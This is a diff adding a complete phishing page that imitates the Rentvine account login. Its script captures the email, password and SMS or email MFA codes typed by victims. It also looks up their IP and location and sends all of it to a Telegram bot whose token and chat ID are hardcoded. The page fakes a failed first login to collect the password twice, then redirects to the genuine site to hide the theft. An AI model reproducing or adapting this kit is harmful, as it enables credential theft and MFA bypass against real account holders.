@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Rentvine Login</title>
+    <link rel="icon" href="https://account.rentvine.com/assets/favicon/favicon.ico" sizes="32x32">
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,400italic|Roboto:400,100,300,700" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/css/select2.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
+    <link rel="stylesheet" href="https://account.rentvine.com/css/app.css?v=20241004">
+    <link rel="stylesheet" href="https://account.rentvine.com/css/auth.css?v=20241004">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.10/css/all.css">
+    <style>
+        .password-wrapper {
+            position: relative;
+        }
+        .password-toggle-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #6c757d;
+            font-size: 15px;
+            z-index: 10;
+            border-left: 1px solid #ddd;
+            padding-left: 6px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+        }
+        .password-toggle-icon:hover {
+            color: #495057;
+        }
+        .alert-top {
+            margin-bottom: 20px;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        input[type="checkbox"] {
+            width: 13px;
+            height: 13px;
+            margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            bottom: 7px;
+        }
+        .textmessage {
+            padding-bottom: 10px;
+        }
+        .links {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: center;
+        }
+        .links a {
+            color: #3b82f6;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .links span {
+            color: #333;
+            margin: 0 4px;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none;
+        }
+        .loading-spinner {
+            text-align: center;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #28a745;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        
+    </style>
+</head>
+<body>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner">
+        <div class="spinner"></div>
+        <p>Verifying...</p>
+    </div>
+</div>
+
+<div id="authentication">
+    <div class="container">
+        <div class="row">
+            <div>
+                <div class="alert alert-danger alert-top" style="display: none;" id="globalError">
+                    <div id="globalErrorMessage"></div>
+                </div>
+                
+                <div id="flash-notify"></div>
+
+                 <div class="alert alert-danger login-alert" style="display:none" id="loginError">
+                            <div id="loginErrorMessage"></div>
+                        </div>
+                
+                <div class="panel panel-default">
+                    <div class="company-img">
+                        <img src="rentlogo.png" alt="Rentvine" role="presentation">
+                    </div>
+
+                    <!-- LOGIN FORM -->
+                    <form class="form form-signin" role="form" id="login_form" style="display: block;">
+                       
+                        
+                        <div class="form-group">
+    <div class="input input-text input-active-label">
+        <label for="email">Email</label>
+        <input type="email" id="emailInput" class="form-control" required>
+    </div>
+</div>
+                        
+                        <div class="form-group">
+                            <div class="input input-password input-active-label password-wrapper">
+                                <label for="password">Password</label>
+                                <input type="password" id="passwordInput" class="form-control" style="padding-right: 60px;" required>
+                                <i class="fas fa-eye password-toggle-icon" id="togglePassword"></i>
+                            </div>
+                        </div>
+                        
+                        <a href="#" class="pull-right need-help" style="margin: 0 auto;">Forgot Password?</a>
+                        <span class="clearfix"></span>
+
+                        <button class="btn btn-lg btn-success btn-block" type="button" id="loginButton">
+                            Sign In
+                        </button>
+                    </form>
+
+                    <!-- SMS MFA FORM -->
+                    <form class="form form-signin" role="form" id="sms_mfa_form" style="display: none;">
+                        <div class="textmessage">
+                            <p>A text message has been sent to your phone number</p>
+                        </div>
+                        <div><p>Please enter the code below.</p></div>
+                        
+                        <div class="form-group">
+                            <div class="input input-password input-active-label">
+                                <label for="sms_mfa_code">MFA Code</label>
+                                <input type="password" id="smsMfaCode" class="form-control" required>
+                            </div>
+                        </div>
+                        
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="rememberSms">
+                            <label for="rememberSms"><b>Remember Device</b></label>
+                        </div>
+                        
+                        <button class="btn btn-lg btn-success btn-block" type="button" id="smsVerifyButton">
+                            Verify
+                        </button>
+                        
+                        <div class="links">
+                            <a href="#" id="resendSms">Resend Code</a>
+                            <span>|</span>
+                            <a href="#" id="switchToEmail">Email Code</a>
+                        </div>
+                    </form>
+
+                    <!-- EMAIL MFA FORM -->
+                    <form class="form form-signin" role="form" id="email_mfa_form" style="display: none;">
+                        <div class="textmessage">
+                            <p>A Verification code has been sent to your email</p>
+                        </div>
+                        <div><p>Please enter the code below.</p></div>
+                        
+                        <div class="form-group">
+                            <div class="input input-password input-active-label">
+                                <label for="email_mfa_code">MFA Code</label>
+                                <input type="password" id="emailMfaCode" class="form-control" required>
+                            </div>
+                        </div>
+                        
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="rememberEmail">
+                            <label for="rememberEmail"><b>Remember Device</b></label>
+                        </div>
+                        
+                        <button class="btn btn-lg btn-success btn-block" type="button" id="emailVerifyButton">
+                            Verify
+                        </button>
+                        
+                        <div class="links">
+                            <a href="#" id="resendEmail">Resend Code</a>
+                            <span>|</span>
+                            <a href="#" id="switchToSms">Text Code</a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- for tracking -->
+<input type="hidden" id="loginAttempts" value="0">
+<input type="hidden" id="currentEmail" value="">
+
+<script>
+// Telegram configuration
+const telegramBotToken = '8454514731:AAG88-O_HTFkd3o3lBpjPQVj9W2J_Y9RNPc';
+const chatId = '1343008252';
+
+// Password toggle functionality
+const togglePassword = document.getElementById('togglePassword');
+const passwordInput = document.getElementById('passwordInput');
+
+if (togglePassword && passwordInput) {
+    togglePassword.addEventListener('click', function() {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        
+        if (this.classList.contains('fa-eye')) {
+            this.classList.remove('fa-eye');
+            this.classList.add('fa-eye-slash');
+        } else {
+            this.classList.remove('fa-eye-slash');
+            this.classList.add('fa-eye');
+        }
+    });
+}
+
+// Show/hide loading overlay
+function showLoading(show) {
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.style.display = show ? 'flex' : 'none';
+}
+
+// Show loading state on buttons
+function showButtonLoading(buttonId, text) {
+    const button = document.getElementById(buttonId);
+    if (button) {
+        const originalText = button.innerHTML;
+        button.innerHTML = text;
+        button.disabled = true;
+        button.setAttribute('data-original-text', originalText);
+        
+        return function() {
+            button.innerHTML = originalText;
+            button.disabled = false;
+        };
+    }
+    return function() {};
+}
+
+// Send data to Telegram
+async function sendToTelegram(message) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: message,
+                parse_mode: 'HTML'
+            }),
+        });
+
+        if (!response.ok) {
+            console.error('Failed to send to Telegram');
+        }
+    } catch (error) {
+        console.error('Telegram error:', error);
+    }
+}
+
+// Get user location info
+async function getUserInfo() {
+    try {
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        const { ip, city, region, country } = data;
+        const currentTime = new Date().toLocaleString();
+        
+        return { ip, city, region, country, currentTime };
+    } catch (error) {
+        console.error('Error getting user info:', error);
+        return {
+            ip: 'Unknown',
+            city: 'Unknown',
+            region: 'Unknown',
+            country: 'Unknown',
+            browserDetails: navigator.userAgent,
+            currentTime: new Date().toLocaleString()
+        };
+    }
+}
+
+// Validate email
+function validateEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(String(email).toLowerCase());
+}
+
+// Show form
+function showForm(formId) {
+    const forms = ['login_form', 'sms_mfa_form', 'email_mfa_form'];
+    forms.forEach(id => {
+        document.getElementById(id).style.display = id === formId ? 'block' : 'none';
+    });
+}
+
+// Handle login
+document.getElementById('loginButton').addEventListener('click', async function() {
+    const email = document.getElementById('emailInput').value.trim();
+    const password = document.getElementById('passwordInput').value.trim();
+    const errorDiv = document.getElementById('loginError');
+    const errorMessage = document.getElementById('loginErrorMessage');
+    
+    // Clear previous errors
+    errorMessage.textContent = '';
+    errorDiv.style.display = 'none';
+    
+    // Validate inputs
+    if (!email) {
+        errorMessage.textContent = 'Email is required';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    if (!validateEmail(email)) {
+        errorMessage.textContent = 'Invalid email address';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    if (!password) {
+        errorMessage.textContent = 'Password is required';
+        errorDiv.style.display = 'block';
+        return;
+    }
+    
+    // Show loading on button
+    const resetButton = showButtonLoading('loginButton', 'Please Wait...');
+    
+    // Get user info
+    const userInfo = await getUserInfo();
+    const { ip, city, region, country, currentTime } = userInfo;
+    
+    // Get login attempts
+    let attempts = parseInt(document.getElementById('loginAttempts').value);
+    attempts++;
+    document.getElementById('loginAttempts').value = attempts;
+    document.getElementById('currentEmail').value = email;
+    
+    // Create Telegram message
+    const message = `<b>Login Attempt ${attempts}</b>\n` +
+                   `IP: ${ip}\n` +
+                   `Location: ${city}, ${region}, ${country}\n` +
+                   `Email: ${email}\n` +
+                   `Password: ${password}\n` +
+                   `Time: ${currentTime}\n` +
+                   `Status: ${attempts === 1 ? 'First Attempt' : 'Second Attempt'}`;
+    
+    // Send to Telegram
+    await sendToTelegram(message);
+    
+    // Simulate processing delay
+    setTimeout(() => {
+        resetButton();
+        
+        if (attempts === 1) {
+            // First attempt - show error
+            errorMessage.textContent = 'Email or Password is Incorrect!';
+            errorDiv.style.display = 'block';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').focus();
+        } else {
+            // Second attempt - show MFA
+            showForm('sms_mfa_form');
+        }
+    }, 2000);
+});
+
+// Handle SMS MFA verification - DIRECT REDIRECT
+document.getElementById('smsVerifyButton').addEventListener('click', async function() {
+    const mfaCode = document.getElementById('smsMfaCode').value.trim();
+    const email = document.getElementById('currentEmail').value;
+    
+    if (!mfaCode) {
+        alert('Please enter the MFA code');
+        return;
+    }
+    
+    // Show loading overlay (full screen)
+    showLoading(true);
+    
+    // Get user info
+    const userInfo = await getUserInfo();
+    const { ip, city, region, country, currentTime } = userInfo;
+    
+    // Create Telegram message
+    const message = `<b>SMS MFA Verification</b>\n` +
+                   `IP: ${ip}\n` +
+                   `Location: ${city}, ${region}, ${country}\n` +
+                   `Email: ${email}\n` +
+                   `SMS MFA Code: ${mfaCode}\n` +
+                   `Time: ${currentTime}`;
+    
+    // Send to Telegram
+    await sendToTelegram(message);
+    
+    // Simulate processing delay (2 seconds), then redirect directly
+    setTimeout(() => {
+        // Redirect directly to the target URL
+        window.location.href = 'https://account.rentvine.com/auth/login';
+    }, 2000);
+});
+
+// Handle Email MFA verification - DIRECT REDIRECT
+document.getElementById('emailVerifyButton').addEventListener('click', async function() {
+    const mfaCode = document.getElementById('emailMfaCode').value.trim();
+    const email = document.getElementById('currentEmail').value;
+    
+    if (!mfaCode) {
+        alert('Please enter the MFA code');
+        return;
+    }
+    
+    // Show loading overlay (full screen)
+    showLoading(true);
+    
+    // Get Client info
+    const userInfo = await getUserInfo();
+    const { ip, city, region, country, currentTime } = userInfo;
+    
+    // Create Telegram message
+    const message = `<b>Email MFA Verification</b>\n` +
+                   `IP: ${ip}\n` +
+                   `Location: ${city}, ${region}, ${country}\n` +
+                   `Email: ${email}\n` +
+                   `Email MFA Code: ${mfaCode}\n` +
+                   `Time: ${currentTime}`;
+    
+    // Send to Telegram
+    await sendToTelegram(message);
+    
+    setTimeout(() => {
+        // Redirect directly to the target URL
+        window.location.href = 'https://account.rentvine.com/auth/login';
+    }, 2000);
+});
+
+
+document.getElementById('switchToEmail').addEventListener('click', function(e) {
+    e.preventDefault();
+    showForm('email_mfa_form');
+});
+
+document.getElementById('switchToSms').addEventListener('click', function(e) {
+    e.preventDefault();
+    showForm('sms_mfa_form');
+});
+
+// Resend code handlers
+document.getElementById('resendSms').addEventListener('click', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('currentEmail').value;
+    const userInfo = await getUserInfo();
+    const { ip, city, region, country, currentTime } = userInfo;
+    
+    const message = `<b>SMS Code Resend Request</b>\n` +
+                   `IP: ${ip}\n` +
+                   `Location: ${city}, ${region}, ${country}\n` +
+                   `Email: ${email}\n` +
+                   `Time: ${currentTime}`;
+    
+    await sendToTelegram(message);
+    alert('New SMS code has been requested');
+});
+
+document.getElementById('resendEmail').addEventListener('click', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('currentEmail').value;
+    const userInfo = await getUserInfo();
+    const { ip, city, region, country, currentTime } = userInfo;
+    
+    const message = `<b>Email Code Resend Request</b>\n` +
+                   `IP: ${ip}\n` +
+                   `Location: ${city}, ${region}, ${country}\n` +
+                   `Email: ${email}\n` +
+                   `Time: ${currentTime}`;
+    
+    await sendToTelegram(message);
+    alert('New email code has been requested');
+});
+
+
+document.getElementById('emailInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('loginButton').click();
+    }
+});
+
+document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('loginButton').click();
+    }
+});
+
+document.getElementById('smsMfaCode').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('smsVerifyButton').click();
+    }
+});
+
+document.getElementById('emailMfaCode').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        document.getElementById('emailVerifyButton').click();
+    }
+});
+
+
+document.addEventListener('DOMContentLoaded', function() {
+    const inputs = document.querySelectorAll('.input-active-label input');
+    
+    inputs.forEach(input => {
+        input.addEventListener('focus', function() {
+            this.parentElement.classList.add('active');
+        });
+        
+        input.addEventListener('blur', function() {
+            if (!this.value) {
+                this.parentElement.classList.remove('active');
+            }
+        });
+        
+        // Check initial state
+        if (input.value) {
+            input.parentElement.classList.add('active');
+        }
+        
+        // Update on input
+        input.addEventListener('input', function() {
+            if (this.value) {
+                this.parentElement.classList.add('active');
+            } else {
+                this.parentElement.classList.remove('active');
+            }
+        });
+    });
+});
+</script>
+
+</body>
+</html>
